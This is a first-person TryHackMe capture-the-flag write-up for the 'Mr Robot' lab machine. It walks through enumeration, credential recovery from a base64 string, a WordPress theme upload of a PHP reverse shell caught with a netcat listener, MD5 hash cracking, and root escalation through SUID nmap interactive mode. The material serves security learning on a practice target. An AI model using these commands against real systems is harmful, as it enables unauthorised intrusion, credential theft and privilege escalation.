## Mr Robot 

Room link: https://tryhackme.com/room/mrrobot

# Key 1

As always, for my first scan I used an aggressive NMAP scan. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A 10.10.110.127
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-18 23:12 EST
Nmap scan report for 10.10.110.127
Host is up (0.14s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.77 seconds
```
It appears I am working with ssh and http/https. 

I used gobuster to enumerate port 80. It returned a LOT of hits. 
```
ajread@aj-ubuntu:~/TryHackMe$ gobuster -u 10.10.228.238 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.228.238/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/19 17:44:50 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/Image (Status: 301)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/images (Status: 301)
/image (Status: 301)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/license (Status: 200)
/login (Status: 302)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/readme (Status: 200)
/rdf (Status: 301)
/render/https://www.google.com (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss2 (Status: 301)
/rss (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-config (Status: 200)
/wp-cron (Status: 200)
/wp-links-opml (Status: 200)
/wp-load (Status: 200)
/wp-login (Status: 200)
/wp-signup (Status: 302)
=====================================================
2022/02/19 18:02:38 Finished
=====================================================
```

There appears to be a robots.txt file. I used curl to investigate the page and found that ```key-1-of-3.txt``` is referenced there. 
```
ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.110.127/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```
I can run ```curl http://10.10.110.127/key-1-of-3.txt``` to get the first key, done! 

# Key 2

The output of the directory enumeration also pointed me to the ```/license``` directory. If I navigate to the site, it appears to supply some base64 encoded string at the bottom of the page. 
```
ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.228.238/license
...
ZWxsaW90OkVSMjgtMDY1Mgo=
```
The base64 encoded string decodes to ```elliot:ER28-0652```. This looks like credentials! Also, it appears there is a login page at ```/wp-login```. Out of curiosity, I tried to newly found credentials on the page and they worked! The site drops me into what appears to be a user blog dashboard run by Wordpress 4.3.1. I do some research and find that I can use this method to upload a reverse shell easily: https://www.hackingarticles.in/wordpress-reverse-shell/ It looks like I could also go the metasploit route. But, let's be adventerous today and try the manual way. The php reverse shell that I use is from pentest monkey on github: https://github.com/pentestmonkey/php-reverse-shell. I made sure to change the IP and port the shell to point back to me local/attack machine. 

With everything in place, I start a netcat listener on my machine. 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
Listening on 0.0.0.0 9999
```
I run a curl command to call the updated php theme that, in reality, is my php reverse shell. 
```
ajread@aj-ubuntu:~$ curl http://10.10.228.238/wp-content/themes/twentyfifteen/404.php
```
And it drops me into a shell! 
```
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 23:16:15 up 38 min,  0 users,  load average: 0.00, 0.36, 1.76
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
I make sure to upgrade the shell with python. 
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ 
```
If I navigate to the home folder of user robot, I find some interesting files.
```
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```
The ```password.raw-md5``` is an MD5 hash of the user robot. I dropped the hash into crackstation (https://crackstation.net/) and found the password for user robot. With the password, I am able to authenticate as robot and read key 2! 
```
daemon@linux:/home/robot$ su robot  
su robot 
Password: [REDACTED]

robot@linux:~$ wc -c key-2-of-3.txt
wc -c key-2-of-3.txt
33 key-2-of-3.txt
```
# Key 3

Key 3 probably requires privilege escalation. I wanted to see if I could use a GTFO bin to execute a binary as root user and gain its privilege. I used ```find / -perm +6000 2>/dev/null``` to do so. 
```
robot@linux:~$ find / -perm +6000 2>/dev/null
find / -perm +6000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
/usr/local/share/xml
/usr/local/share/xml/schema
/usr/local/share/xml/declaration
/usr/local/share/xml/misc
/usr/local/share/xml/entities
/usr/local/share/ca-certificates
/usr/local/share/sgml
/usr/local/share/sgml/dtd
/usr/local/share/sgml/declaration
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/misc
/usr/local/share/sgml/entities
/usr/local/share/fonts
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/usr/local/lib/python3.4
/usr/local/lib/python3.4/dist-packages
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
/var/local
/var/lib/libuuid
/var/mail
/sbin/unix_chkpwd
```
Analyzing the output of the command, it looks like I can priv esc using nmap run in interactive mode (https://vk9-sec.com/nmap-privilege-escalation/). 

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```
Nmap has some cool commands in interactive mode that I didnt know about. 

```
nmap> h
h
Nmap Interactive Commands:
n <nmap args> -- executes an nmap scan using the arguments given and
waits for nmap to finish.  Results are printed to the
screen (of course you can still use file output commands).
! <command>   -- runs shell command given in the foreground
x             -- Exit Nmap
f [--spoof <fakeargs>] [--nmap_path <path>] <nmap args>
-- Executes nmap in the background (results are NOT
printed to the screen).  You should generally specify a
file for results (with -oX, -oG, or -oN).  If you specify
fakeargs with --spoof, Nmap will try to make those
appear in ps listings.  If you wish to execute a special
version of Nmap, specify --nmap_path.
n -h          -- Obtain help with Nmap syntax
h             -- Prints this help screen.
Examples:
n -sS -O -v example.com/24
f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24
```
It seems that running a command with ```!``` at the beginning allows me to run a shell command. And like that, I can read the last key! 

```
nmap> !wc -c /root/key-3-of-3.txt
!wc -c /root/key-3-of-3.txt
33 /root/key-3-of-3.txt
waiting to reap child : No child processes
```